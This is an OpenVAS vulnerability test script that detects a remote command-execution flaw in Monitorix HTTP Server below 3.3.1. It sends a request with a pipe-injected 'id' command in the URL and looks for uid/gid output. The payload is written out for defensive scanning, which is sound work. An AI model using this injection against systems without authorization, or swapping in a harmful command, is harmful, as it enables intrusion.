###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_monitorix_63913.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Monitorix HTTP Server Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103855");
  script_bugtraq_id(63913);
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Monitorix HTTP Server Remote Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.monitorix.org/news.html#N331");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-12-12 14:22:20 +0100 (Thu, 12 Dec 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Monitorix/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary commands
in the context of the affected server.");
  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"The handle_request() routine did not properly perform input sanitization
which led into a number of security vulnerabilities.");
  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Monitorix HTTP Server Remote Code Execution Vulnerability");
  script_tag(name:"affected", value:"Monitorix < 3.3.1");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:8080 );
banner = get_http_banner( port:port );
if( ! banner || "Monitorix" >!< banner ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  url = dir + '|id|';
  if( ret = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*" ) ) {
    report = 'It was possible to execute the "id" command on the remote host.\n\n' +
             'By requesting the URL "' + url + '" we received the following response:' +
             '\n\n' + ret + '\n';
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
